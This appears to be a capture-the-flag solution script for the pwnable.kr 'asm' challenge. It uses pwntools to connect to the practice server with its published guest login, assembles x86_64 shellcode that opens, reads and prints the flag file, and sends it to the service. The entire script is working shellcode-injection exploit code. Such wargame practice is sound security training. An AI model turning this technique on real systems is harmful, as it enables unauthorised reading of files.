from pwn import *

sh = ssh('asm', 'pwnable.kr', password='guest', port=2222)
machine = sh.remote('0', 9026)
context.update(arch='x86_64', os='linux')

flag_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'


shellcode = asm(
# push to flag path to stack
    shellcraft.pushstr(flag_name) +
# open the flag file
    shellcraft.open('rsp', flags=0, mode=0) +
# read the flag and store it
    shellcraft.read('rax', 'rsp', 128) +
# print the flag
    shellcraft.syscall('SYS_write',1, 'rsp', 128)
)

machine.recvuntil('code:')
machine.sendline(shellcode)
flag = str(machine.recvline())
print("The flag>>> " + flag)
